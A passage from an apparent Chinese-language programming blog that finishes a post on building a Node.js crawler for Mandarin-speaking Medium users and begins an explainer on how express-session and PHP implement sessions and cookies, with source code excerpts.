&amp;&amp; jp.length &gt;= 3) &#123; return true &#125; return false&#125; 如果含有三個以上的日文字母，就回傳是日文。這邊會設定數量是我怕有些台灣人用什麼 の 之類的，就會被誤判。不過除了寫死數量以外，還有個比較好的做法可能是看比例，例如說一句話如果有八九成是中文字，就是中文之類的。 判斷邏輯的部分改成這樣： 12345678910const info = await getUserInfo(userId) // 非中文，直接略過if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue;&#125; if (isJapanese(info.bio) || isJapanese(info.name)) &#123; continue;&#125; 如果不是中文就跳過，再來確認是不是日文，如果自介或是暱稱是日文也跳過。 好，這樣就沒有問題了吧！於是我把資料砍光，再讓爬蟲跑一個晚上試試看。 隔天起來，發現我真是天真的可以。 第四版爬蟲：直接重構 打開資料庫，發現還是有很多日本使用者。原因在於他們可能暱稱是用漢字，然後沒有寫自介，或者自介只有一兩個字之類的，所以還是會被判定為是中文使用者。 追根究底，都是這個判斷機制太不可靠的原因。 既然事情已經到這個地步，就沒辦法偷懶了，我只能實作剛開始提到的更準確的解法：「看看最近發表過或是拍手過的文章是不是中文」，而這部分的資料幸好原本的 API 就有提供，實作起來比想像中簡單許多。 除了這個以外，由於 queue 增長的速度比消耗的速度快太多，因此我一度改變了一下方法。我寫了另外一支小程式，把原本流程中的「把 followers 丟到 queue」拿掉，並且一次拿 10 筆使用者資料出來。 換句話說，這個新的小程式做的事情很簡單，就是不斷抓使用者資料並存到資料庫，這樣 queue 就會一直變小，讓使用者資料愈來愈多。大概一個小時可以抓兩萬筆，累積一個晚上的 queue 白天花半天就可以跑完。 好處就是我可以快速累積使用者資料，畢竟原本的實作太慢了，一天大概只能跑個一萬筆左右，現在新的實作因為不用把東西丟到 queue 裡面，會讓使用者資料長得很快。 那時候偷懶直接複製程式碼改一下就做完這個新的小程式，導致程式寫到這邊愈來愈亂，考量到之後想要 open source，是時候整理一下程式碼了，於是就順便把程式重構一下。 重構完的架構如下： 12345678910.├── README.md // 說明├── app.js // 主程式├── getUsers.js // 只抓使用者資料的小程式 ├── config.js // 設定檔├── db.js // 資料庫相關├── medium.js // medium API 相關├── package.json ├── queue.js └── utils.js 我們先從 config 開始看起吧： 12345678910111213141516module.exports = &#123; db: &#123; connectionLimit: 10, host : '', user : '', password : '', database : 'medium', charset: 'utf8mb4' &#125;, batchLimit: 1, // 一次抓多少筆使用者資料 randomDelay: function() &#123; return Math.floor(Math.random() * 200) + 100 &#125;, errorRateTolerance: 0.2, delayWhenError: 500&#125; 這邊就是放一些設定檔，包括資料庫的設定以及一些抓資料的參數，大多數都是跟抓使用者資料的那個小程式有關，例如說要抓幾筆，然後每一次要停多久之類的。這些都是為了避免送太多 request 被擋而做的措施。 再來看一下 utils.js： 12345678910111213141516171819202122232425262728module.exports = &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 isChinese: (text = '') =&gt; &#123; const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex) &#125;, // @see: https://gist.github.com/ryanmcgrath/982242 isJapanese: (text = '') =&gt; &#123; const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) // more than 2 japanese char if (jp &amp;&amp; jp.length &gt;= 2) &#123; return true &#125; return false &#125;, sleep: ms =&gt; new Promise(resolve =&gt; &#123; setTimeout(resolve, ms) &#125;), log: function () &#123; const args = Array.prototype.slice.call(arguments); console.log.apply(console, args) &#125;&#125; 這邊基本上就是把剛剛用到的一些函式搬過來統一放在這邊，日文字母的限制縮小為兩個，然後把 console.log 包裝了一下，想說之後要客製化比較方便。 然後是 medium.js，這邊是有關 medium API 的部分，並且新增了一個函式 isMandarinUser 來判斷是否是中文使用者： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980const axios = require('axios')const _ = require('lodash')const utils = require('./utils')const JSON_HIJACKING_PREFIX = '])&#125;while(1);&lt;/x&gt;' // wrapper function, return null instead of throwing errorasync function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace(JSON_HIJACKING_PREFIX, '')) return json &#125; catch(err) &#123; return null &#125;&#125; function isMandarinUser(name, bio, posts) &#123; // if bio or name is japanese, must be japanese if (utils.isJapanese(name) || utils.isJapanese(bio)) &#123; return false &#125; // this user has no activity on medium, decide by name and bio if (!posts) &#123; return utils.isChinese(name) || utils.isChinese(bio) &#125; const contents = _.values(posts).map(item =&gt; item.title + _.get(item, 'content.subtitle')) return Boolean( contents.find(item =&gt; &#123; return utils.isChinese(item) &amp;&amp; !utils.isJapanese(item) &#125;) )&#125; module.exports = &#123; getFollowers: async (uid, to) =&gt; &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return null &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125; &#125;, getUserInfo: async (uid) =&gt; &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) const posts = _.get(json, 'payload.references.Post') const name = _.get(json, 'payload.user.name') const bio = _.get(json, 'payload.user.bio') return &#123; isMandarinUser: isMandarinUser(name, bio, posts), userId, name, username: _.get(json, 'payload.user.username'), bio, followerCount: follower, mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125; &#125;&#125; isMandarinUser 會根據三個參數來決定：暱稱、自介以及相關文章。相關文章可能是使用者最近發表過的或者是回覆過與拍手過的文章，會根據文章的標題以及副標題來做判定。 如果使用者沒有任何活動的話，就會跟之前一樣採用自介跟暱稱來判定，所以還是有誤判的可能，但實測過後誤判率已經滿低的了。 接著來看與資料庫相關的操作，db.js： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788const mysql = require('mysql')const moment = require('moment') function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss')&#125; function transform(info) &#123; return [ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled, null ]&#125; class DB &#123; constructor(config) &#123; this.conn = mysql.createPool(config) &#125; getExistingUserIds() &#123; return new Promise((resolve, reject) =&gt; &#123; this.conn.query('SELECT userId from Users', (err, results) =&gt; &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item =&gt; item.userId)) &#125;); &#125;) &#125; getUserIds(limit) &#123; return new Promise((resolve, reject) =&gt; &#123; this.conn.query('SELECT userId from Users where fr=\"TW\" order by follower desc limit ' + limit, (err, results) =&gt; &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item =&gt; item.userId)) &#125;); &#125;) &#125; deleteUserIds(userIds) &#123; return new Promise((resolve, reject) =&gt; &#123; this.conn.query('DELETE from Queues WHERE userId IN (?)', [userIds], (err, results) =&gt; &#123; if (err) &#123; return reject(err) &#125; return resolve(userIds) &#125;) &#125;) &#125; insertUserData(info) &#123; if (!info) return const data = Array.isArray(info) ? info.map(transform) : [transform(info)] this.conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled, fr ) VALUES ?`, [data], (err) =&gt; &#123; if (err) &#123; // console.log(err) &#125; &#125; ) &#125; insertIntoQueue(list) &#123; return new Promise((resolve, reject) =&gt; &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125;&#125; module.exports = DB 基本上就是把一大堆 SQL query 包裝成 Promise 以及 function，方便其他的 module 來使用。大部分的函式都能夠接收一個 array 來做批次操作，這樣會更有效率一點。 而且把這些東西包裝起來之後，queue 的程式碼就會變得非常單純： 1234567891011121314151617class Queue &#123; constructor(db) &#123; this.db = db &#125; async get(limit) &#123; const items = await this.db.getUserIds(limit) await this.db.deleteUserIds(items) return items &#125; async push(list) &#123; await this.db.insertIntoQueue(list) &#125;&#125; module.exports = Queue 最後來看一下我們的主程式 app.js，在重構之後程式碼變得乾淨很多，可讀性也提昇了不少： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374const DB = require('./db')const Queue = require('./queue')const config = require('./config')const medium = require('./medium')const utils = require('./utils') async function main() &#123; const db = new DB(config.db) const queue = new Queue(db) const existingUserIds = await db.getExistingUserIds() const userIdMap = &#123;&#125; for (let userId of existingUserIds) &#123; userIdMap[userId] = true &#125; utils.log('Existing userId:', existingUserIds.length) while(true) &#123; const userIds = await queue.get(1) if (userIds.length === 0) &#123; utils.log('Done') break &#125; const userId = userIds[0] if (userIdMap[userId]) &#123; continue &#125; userIdMap[userId] = true utils.log('userId:', userId) try &#123; const userInfo = await medium.getUserInfo(userId) if (!userInfo.userId) &#123; utils.log('getUerrInfo error, sleep for', config.delayWhenError) await utils.sleep(config.delayWhenError) &#125; if (!userInfo.isMandarinUser) &#123; utils.log(userId, 'not MandarinUser') continue &#125; db.insertUserData(userInfo) if (userInfo.followerCount &gt; 0) &#123; let to = undefined let count = 0 while (true) &#123; const data = await medium.getFollowers(userInfo.userId, to) if (!data) &#123; break &#125; const &#123; nextTo, followers &#125; = data to = nextTo count += followers.length utils.log(userInfo.userId, 'fetching', count, 'followers') await queue.push(followers.filter(uid =&gt; !userIdMap[uid])) if (followers.length === 0 || !to) &#123; break &#125; &#125; &#125; &#125; catch (err) &#123; utils.log('sleep for', config.delayWhenError) utils.log(err) await utils.sleep(config.delayWhenError) &#125; &#125; process.exit()&#125; main() 這邊有個機制與之前不一樣，之前是每次從 queue 拿一個 userId 出來就去資料庫確認一下是否爬過，但是這樣太沒有效率。在這個版本改成程式執行時就直接從資料庫裡面把所有資料拿出來，並且變成一個 map，如果有值的話就代表已經抓取過，反之亦然。 重構過的程式碼把 module 切開之後看起來順眼很多，而且要改什麼都很容易，沒有重構過的話我還真不敢 open source 出去… 這邊是重構完的程式碼：https://github.com/aszx87410/medium-user-crawler 總結 在寫爬蟲的過程中也是踩了滿多坑的，其中最麻煩的就是語言判斷那一塊，當初沒有想到日文漢字這個 case 要判斷，花了不少時間。偷懶也花了很多時間，原本偷懶不想用更精確的方法來做判定，沒想到最後還是得用，中間浪費了不少時間。 這爬蟲還有滿多地方可以改進的，例如說執行速度的部分，或者是判定語言的部分，目前是我把資料撈出來之後手動標是香港、台灣還是中國，但或許可以寫一些小程式來自動判定，例如說簡體就是中國，有出現一些粵語的字就是香港，反之則是台灣等等，雖然不一定準確，但至少用程式來輔助會方便很多。 這篇主要是分享一下我寫這個爬蟲的歷程，其實只要資料來源能確定抓得到，其他都不是什麼大問題。再加上這個爬蟲沒有很完整（例如說沒有 retry 機制），所以花個一兩天就能夠實作完成了。 希望這篇有吸引到大家，也很希望大家能試試看自己爬資料，做出有趣的數據分析！","link":"/2019/07/12/medium-crawler/"},{"title":"深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","text":"前言 這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的最後一篇，三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 第一篇以白話的方式來談 Session 與 Cookie，全篇沒有談到太多技術名詞；第二篇直接去看 Cookie 的三份 RFC 來理解到底什麼是 Session，也補齊了一些 Cookie 相關的知識。而這一篇則是要深入 Session，一起帶大家看看三種不同的 Session 實作方式。 這三樣分別是 Node.js 的 Web 框架 Express、PHP 以及 Ruby on Rails。會挑選這三個是因為他們對於 Session 機制的實作都不同，是我覺得很適合拿來參考的對象。 好，接著就開始吧！ Express Express 本身是個極度輕量的框架，有許多其他框架底下的基本功能，在這邊都要額外安裝 middleware 才能使用。 先來簡單介紹一下 middleware 的概念。在 Express 裡面，當收到一個 Request 之後就會轉交給相對應的 middleware 來做處理，處理完以後變成 Response 回傳回去。所以 Express 的本質其實就是一大堆 middleware。 用圖解釋的話會長這樣： 舉個例子好了，一段基本的程式碼會長這樣： 123456789101112131415161718const express = require('express')const app = express()const port = 5001 // global 的 middlewareapp.use((req, res, next) =&gt; &#123; req.greeting = 'hello' next()&#125;) // 特定 route 的 middlewareapp.get('/', (req, res) =&gt; &#123; res.end(req.greeting)&#125;) app.listen(port, () =&gt; &#123; console.log(`Example app listening on port $&#123;port&#125;!`)&#125;) 第一個 middleware 是 global 的，所以任何 request 都會先到達這個 middleware，而這邊可以對 req 或是 res 這兩個參數設置一些東西，最後呼叫 next 把控制權轉給下一個 middleware。 而下一個 middleware 就可以拿到前面的 middleware 處理過後的資訊，並且輸出內容。如果沒有呼叫 next，代表不想把控制權轉移給下個 middleware。 在 Express 裡面，管理 Session 的 middleware 是 express-session，範例程式碼長這樣（改寫自官網範例）： 123456789101112131415161718192021222324252627282930const express = require('express')const session = require('express-session') const app = express()const port = 5001 // 使用 session middlewareapp.use(session(&#123; secret: 'keyboard cat'&#125;)) app.get('/', function(req, res, next) &#123; // 可以用 req.session 拿取存在 session 的值 // 這邊判斷有沒有 req.session.views // 如果有的話就 +1，反之初始化成 1 // 所以 req.session 可讀也可寫 if (req.session.views) &#123; req.session.views++ res.write('views: ' + req.session.views) res.end() &#125; else &#123; req.session.views = 1 res.end('welcome to the session demo. refresh!') &#125;&#125;) app.listen(port, () =&gt; &#123; console.log(`Example app listening on port $&#123;port&#125;!`)&#125;) 使用了 session middleware 以後，可以直接用 req.session.key 來存取你要的資訊，同一個變數可以寫入也可以讀取，跟 PHP 的 $_SESSION 有異曲同工之妙。 接著我們來看看 express-session 的程式碼吧！主要的程式碼都在 index.js 這個檔案，大概有快七百行，不太可能一行一行講解。 而且寫得好的 library，會花很多精力在向後相容以及資料合法性的檢查，這些都是一些比較瑣碎而且對於想要理解機制比較沒幫助的東西。 所以我會直接把程式碼稍微整理一下，去除掉比較不重要的部分並且重新組織程式碼，只挑出相關的段落。 我們會關注三個重點： sessionID 如何產生 sessionID 儲存方式 session 資訊儲存方式 可以先來看產生 sessionID 的地方： 1234567891011121314151617// get the session id generate functionvar generateId = opts.genid || generateSessionId // generates the new sessionstore.generate = function(req)&#123; req.sessionID = generateId(req); req.session = new Session(req); req.session.cookie = new Cookie(cookieOptions); if (cookieOptions.secure === 'auto') &#123; req.session.cookie.secure = issecure(req, trustProxy); &#125;&#125;; function generateSessionId(sess) &#123; return uid(24);&#125; express-session 的客製化程度很高，可以自己傳進去產生 sessionID 的函式。若是沒有傳，預設會使用 uid(24)，這邊的 uid 指的是 uid-safe 這個 library，會產生一個長度為 24 bytes 的隨機 ID。 文件上有特別說明這個長度： Asynchronously create a UID with a specific byte length. Because base64 encoding is used underneath, this is not the string length. For example, to create a UID of length 24, you want a byte length of 18. 所以填入 24，最後產生出來的會是長度為 32 個字元的字串。 那這個 sessionID 是以什麼樣的形式存進 Cookie 的呢？ 12345678910111213141516171819202122232425262728293031var cookie = require('cookie')var signature = require('cookie-signature') // get the session cookie namevar name = opts.name || opts.key || 'connect.sid' // get the cookie signing secretvar secret = opts.secret if (secret &amp;&amp; !Array.isArray(secret)) &#123; secret = [secret];&#125; // set-cookieonHeaders(res, function()&#123; // set cookie setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);&#125;); function setcookie(res, name, val, secret, options) &#123; var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); debug('set-cookie %s', data); var prev = res.getHeader('Set-Cookie') || [] var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('Set-Cookie', header)&#125; 存在 cookie 裡面的 sessionID 的 key 一樣可以自己指定，但預設會是 connect.sid，所以以後一看到這個 key 就知道這是 express-session 預設的 sessionID 名稱。 內容的部分比較特別一點，會以 s: 開頭，後面接上 signature.sign(sessionID, secret) 的結果。 這邊要再看到 cookie-signature 這個 library，底下是一個簡單範例： 1234var cookie = require('cookie-signature'); var val = cookie.sign('hello', 'tobiiscool');val.should.equal('hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI'); 這邊的 sign 到底做了什麼呢？原始碼很簡單，可以稍微看一下： 1234567891011121314151617181920var crypto = require('crypto'); /** * Sign the given `val` with `secret`. * * @param &#123;String&#125; val * @param &#123;String&#125; secret * @return &#123;String&#125; * @api private */ exports.sign = function(val, secret)&#123; if ('string' != typeof val) throw new TypeError(\"Cookie value must be provided as a string.\"); if ('string' != typeof secret) throw new TypeError(\"Secret string must be provided.\"); return val + '.' + crypto .createHmac('sha256', secret) .update(val) .digest('base64') .replace(/\\=+$/, '');&#125;; 就只是把你要 sign 的內容用 hmac-sha256 產生一個鑑別碼，並且加在字串後面而已，中間會用.來分割資料。 若是你不知道什麼是 hmac 的話我稍微提一下，簡單來說就是可以對一串訊息產生鑑別碼，目的是為了保持資料的完整性讓它不被竄改。你可以想成它就是訊息對應到的一組獨一無二的代碼，如果訊息被改掉了，代碼也會不一樣。 以上面的範例來說，hello 利用 tobiiscool 這個 secret，得到的結果為：DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，於是完整字串就變為：hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，前面是我的資料，後面是資料的鑑別碼。 如果有人想竄改資料，例如說把前面改成 hello2，那這個資料的鑑別碼就不會是後面那一串，我就知道有人篡改資料了。所以藉由這樣的方式來保持資料完整性，其實原理跟 JWT 是差不多的，你看得到資料但沒辦法改它，因為改了會被發現。 你可能會疑惑說：那我幹嘛不把整個 sessionID 加密就好？為什麼要多此一舉用這種方式？我自己猜測是因為原始資料其實不怕別人看，只是怕人改而已；若是原始資料是敏感資訊，會用加密的方式。但因為原始資料只是 sessionID 而已，被別人看到也沒什麼關係，只要保障資料完整性即可。而且加密需要的系統資源應該比這種訊息驗證還多，因此才採用這種方式。 好，我們再講回來前面，所以 express-session 會把 sessionID 存在 cookie 裡面，key 是 connect.sid，value 則是 s:{sessionID}.{hmac-sha256(sessionID, secret)}。 好奇的話你可以去任何使用 Express 的網站然後看一下 cookie 內容，就可以找到實際的資料（或是自己隨便執行一個也行），這邊我用我的當作範例，我的 connect.sid 是： s%3AfZZVCDHefchle2LDK4PzghaR3Ao9NruG.J%2BsOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM，把特殊字元 decode 之後變成： s:fZZVCDHefchle2LDK4PzghaR3Ao9NruG.J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。 也就是說我的 sessionID 是fZZVCDHefchle2LDK4PzghaR3Ao9NruG，鑑別碼是J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。 知道儲存 sessionID 的方式以後，從 cookie 裡面取得 sessionID 的方式應該也能看懂，就是把事情反過來做而已： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// get the session ID from the cookievar cookieId = req.sessionID = getcookie(req, name, secrets); function getcookie(req, name, secrets) &#123; var header = req.headers.cookie; var raw; var val; // read from cookie header if (header) &#123; var cookies = cookie.parse(header); raw = cookies[name]; if (raw) &#123; if (raw.substr(0, 2) === 's:') &#123; val = unsigncookie(raw.slice(2), secrets); if (val === false) &#123; debug('cookie signature invalid'); val = undefined; &#125; &#125; else &#123; debug('cookie unsigned') &#125; &#125; &#125; return val;&#125; /** * Verify and decode the given `val` with `secrets`. * * @param &#123;String&#125; val * @param &#123;Array&#125; secrets * @returns &#123;String|Boolean&#125; * @private */function unsigncookie(val, secrets) &#123; for (var i = 0; i &lt; secrets.length; i++) &#123; var result = signature.unsign(val, secrets[i]); if (result !== false) &#123; return result; &#125; &#125; return false;&#125; 接下來就剩最後一個了，session 資訊到底存在哪裡？是存在記憶體、檔案，還是其他地方？ 其實這個在程式碼裡面寫得很清楚了，預設是存在記憶體裡面的： 12345678910111213var warning = 'Warning: connect.session() MemoryStore is not\\n' + 'designed for a production environment, as it will leak\\n' + 'memory, and will not scale past a single process.'; // get the session storevar store = opts.store || new MemoryStore() // notify user that this store is not// meant for a production environment/* istanbul ignore next: not tested */if (env === 'production' &amp;&amp; store instanceof MemoryStore) &#123; console.warn(warning);&#125; 那到底是怎麼存呢？可以參考 session/memory.js： 1234567891011121314151617181920212223242526function MemoryStore() &#123; Store.call(this) this.sessions = Object.create(null)&#125; MemoryStore.prototype.get = function get(sessionId, callback) &#123; defer(callback, null, getSession.call(this, sessionId))&#125; MemoryStore.prototype.set = function set(sessionId, session, callback) &#123; this.sessions[sessionId] = JSON.stringify(session) callback &amp;&amp; defer(callback)&#125; function getSession(sessionId) &#123; var sess = this.sessions[sessionId] if (!sess) &#123; return &#125; // parse sess = JSON.parse(sess) return sess&#125; 首先用 Object.create(null) 創造出一個乾淨的 Object（這是很常用的一個方法，沒看過的可以參考：詳解 Object.create(null)），然後以 sessionID 作為 key，JSON.stringigy(session)作為 value，存到這個 object 裡面。 所以說穿了其實 express-session 的 session information 預設就是存在一個變數裡面而已啦，因此你只要一把 process 結束掉重開，session 的資料就都全部不見了。而且會有 memory leak 的問題，所以官方也不推薦用在 production 上面。 如果要用在 production 上面，必須額外再找store來用，例如說 connect-redis 就可以跟 express-session 搭配，把 session information 存在 redis 裡。 以上就是 Express 常用的 middleware：express-session 的原始碼分析。從上面的段落我們清楚知道了 sessionID 的產生方式以及如何存在 cookie，還有 session information 所儲存的地方。 PHP（7.2 版本） PHP 內建就有 session 機制，不必使用任何的 framework，而使用的方法也很簡單： 1234567891011&lt;?phpsession_start(); if (empty($_SESSION['views'])) &#123; $_SESSION['views'] = 1;&#125; else &#123; $_SESSION['views']++;&#125; echo $_SESSION['views'];?&gt; 其實跟 express-session 的用法有點像，只是一個是 req.session，一個是$_SESSION。 我原本也想跟剛剛看 express-session 一樣，直接去看 PHP 的原始碼，然後從中發現如何實作。但因為 PHP 的原始碼全部都是 C，對我這種幾乎沒寫過 C 的人來說很難看懂，因此我也只能反過來。先跟大家介紹 PHP 的 Session 機制是如何實作的，再從原始碼裡面去找證據支援。 首先呢，PHP 的 Session 機制與 express-session 差不多，都會在 Cookie 裡存放一個 sessionID，並且把 session information 存在伺服器。express-session 預設是存在記憶體，PHP 預設則是存在檔案裡面。 以上這些都可以在 PHP 的設定檔調整，都寫在 php.ini 裡面，底下以我的為例，列出一些相關的設定： 12345678910111213141516171819202122[Session]; Handler used to store/retrieve data.; http://php.net/session.save-handlersession.save_handler=files ; Argument passed to save_handler. In the case of files, this is the path; where data files are stored. Note: Windows users have to change this; variable in order to use PHP's session functions.;; The path can be defined as:;; session.save_path = \"N;/path\" session.save_path=\"/opt/lampp/temp/\" ; Name of the session (used as cookie name).; http://php.net/session.namesession.name=PHPSESSID ; Handler used to serialize data. php is the standard serializer of PHP.; http://php.net/session.serialize-handlersession.serialize_handler=php 在 Cookie 裡面你就能看見一個 PHPSESSID，值大概長得像這樣：fc46356f83dcf5712205d78c51b47c4d，這就是 PHP 所使用的 sessionID。 接著你去 session.save_path 看，就會看到儲存你 session 資訊的檔案，檔名很好認，就是 sess_ 加上 sessionID： 123456root@debian:/opt/lampp/temp# ls adminer.invalidadminer.versionsess_04719a35fb67786d574ec6eca969f7cbsess_fc46356f83dcf5712205d78c51b47c4d 若是打開 session 檔案，內容會是被序列化（serialize）之後的結果： 1views|i:5; 這就是 PHP session 的真面目了。把 session information 全都存在檔案裡面。 若是想要研究 PHP session 的相關原始碼，最重要的檔案就是這兩個：ext/session/session.c 跟 ext/session/mod_files.c，前者管理 session 生命週期，後者負責把 session 實際存到檔案裡面或者是讀出來。後者其實就很像我們在 express-session 裡面看到的 Store，只要遵守一樣的 interface，就可以自己寫一個其他的 mod 出來，例如說 mod_redis.c 之類的。 接著我們一樣先來找找看 sessionID 是如何產生的，可以直接在 mod_files.c 搜尋相關字眼，就會找到底下這段： 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * Create session ID. * PARAMETERS: PS_CREATE_SID_ARGS in php_session.h * RETURN VALUE: Valid session ID(zend_string *) or NULL for FAILURE. * * PS_CREATE_SID_FUNC() must check collision. i.e. Check session data if * new sid exists already. * *mod_data is guaranteed to have non-NULL value. * NOTE: Default php_session_create_id() does not check collision. If * NULL is returned, session module create new ID by using php_session_create_id(). * If php_session_create_id() fails due to invalid configuration, it raises E_ERROR. * NULL return value checks from php_session_create_id() is not required generally. */PS_CREATE_SID_FUNC(files)&#123; zend_string *sid; int maxfail = 3; PS_FILES_DATA; do &#123; sid = php_session_create_id((void**)&amp;data); if (!sid) &#123; if (--maxfail &lt; 0) &#123; return NULL; &#125; else &#123; continue; &#125; &#125; /* Check collision */ /* FIXME: mod_data(data) should not be NULL (User handler could be NULL) */ if (data &amp;&amp; ps_files_key_exists(data, ZSTR_VAL(sid)) == SUCCESS) &#123; if (sid) &#123; zend_string_release(sid); sid = NULL; &#125; if (--maxfail &lt; 0) &#123; return NULL; &#125; &#125; &#125; while(!sid); return sid;&#125; 這邊呼叫了 php_session_create_id 來產生 sessionID，然後會檢查有沒有產生重複的 id，有的話就重試最多三次。而 php_session_create_id 則是存在於 session.c 那個檔案： 1234567891011121314151617#define PS_EXTRA_RAND_BYTES 60 PHPAPI zend_string *php_session_create_id(PS_CREATE_SID_ARGS) /* &#123;&#123;&#123; */&#123; unsigned char rbuf[PS_MAX_SID_LENGTH + PS_EXTRA_RAND_BYTES]; zend_string *outid; /* Read additional PS_EXTRA_RAND_BYTES just in case CSPRNG is not safe enough */ if (php_random_bytes_throw(rbuf, PS(sid_length) + PS_EXTRA_RAND_BYTES) == FAILURE) &#123; return NULL; &#125; outid = zend_string_alloc(PS(sid_length), 0); ZSTR_LEN(outid) = bin_to_readable(rbuf, PS(sid_length), ZSTR_VAL(outid), (char)PS(sid_bits_per_character)); return outid;&#125; 重點其實只有這一個：php_random_bytes_throw，這個 function 如果繼續追下去會找到 ext/standard/php_random.h，然後找到 ext/standard/random.c，才是真正產生隨機數的地方。 但最後找到的那個 function 想要看懂必須花一大段時間，因此我就沒有細看了。總之在不同作業系統上會有不同的產生方式，其中一種還會使用到 /dev/urandom。 知道了 sessionID 的產生方式以後，我們來看看 PHP 的 session information 是怎麼做 serialize 的。可以在官方文件上看到一個 function 叫做：session_encode，輸出的結果跟我們在 session 檔案裡面看到的資料一模一樣，而這個 function 的敘述寫著： session_encode() returns a serialized string of the contents of the current session data stored in the $_SESSION superglobal. By default, the serialization method used is internal to PHP, and is not the same as serialize(). The serialization method can be set using session.serialize_handler. 接著我們直接在 session.c 裡面搜尋session_encode，會找到這一段： 1234567891011121314151617/* &#123;&#123;&#123; proto string session_encode(void) Serializes the current setup and returns the serialized representation */static PHP_FUNCTION(session_encode)&#123; zend_string *enc; if (zend_parse_parameters_none() == FAILURE) &#123; return; &#125; enc = php_session_encode(); if (enc == NULL) &#123; RETURN_FALSE; &#125; RETURN_STR(enc);&#125; 只是一個 php_session_encode 的 wrapper 而已，而且 php_session_encode 也只是再呼叫別的東西： 1234567891011121314static zend_string *php_session_encode(void) /* &#123;&#123;&#123; */&#123; IF_SESSION_VARS() &#123; if (!PS(serializer)) &#123; php_error_docref(NULL, E_WARNING, \"Unknown session.serialize_handler. Failed to encode session object\"); return NULL; &#125; return PS(serializer)-&gt;encode(); &#125; else &#123; php_error_docref(NULL, E_WARNING, \"Cannot encode non-existent session\"); &#125; return NULL;&#125;/* &#125;&#125;&#125; */ return PS(serializer)-&gt;encode(); 這一句才是重點。其實追到這邊的時候就有點卡住，因為不清楚這邊的 serializer 是從哪邊來的。但往下稍微看一下程式碼，找到一段應該是相關的： 123456789101112131415161718192021222324252627#define PS_DELIMITER '|' PS_SERIALIZER_ENCODE_FUNC(php) /* &#123;&#123;&#123; */&#123; smart_str buf = &#123;0&#125;; php_serialize_data_t var_hash; PS_ENCODE_VARS; PHP_VAR_SERIALIZE_INIT(var_hash); PS_ENCODE_LOOP( smart_str_appendl(&amp;buf, ZSTR_VAL(key), ZSTR_LEN(key)); if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) &#123; PHP_VAR_SERIALIZE_DESTROY(var_hash); smart_str_free(&amp;buf); return NULL; &#125; smart_str_appendc(&amp;buf, PS_DELIMITER); php_var_serialize(&amp;buf, struc, &amp;var_hash); ); smart_str_0(&amp;buf); PHP_VAR_SERIALIZE_DESTROY(var_hash); return buf.s;&#125;/* &#125;&#125;&#125; */ 會知道相關是因為 #define PS_DELIMITER '|' 這一行，這個符號在 session 檔案裡有出現，可以猜測應該是拿來分隔什麼東西的。而實際的值則是交給php_var_serialize處理。 php_var_serialize若是繼續往下追，可以找到 ext/standard/var.c（直接用 GitHub 搜尋功能就可以找到這個檔案，搜尋功能超方便的），最後就會找到真正在處理的地方：php_var_serialize_intern，裡面會針對不同的形態去呼叫不同的 function。 以我們之前存在 session 裡面的 views 來說，是一個數字，所以會跑到這個 function： 1234567static inline void php_var_serialize_long(smart_str *buf, zend_long val) /* &#123;&#123;&#123; */&#123; smart_str_appendl(buf, \"i:\", 2); smart_str_append_long(buf, val); smart_str_appendc(buf, ';');&#125;/* &#125;&#125;&#125; */ 追到這邊，就知道為什麼當初 session 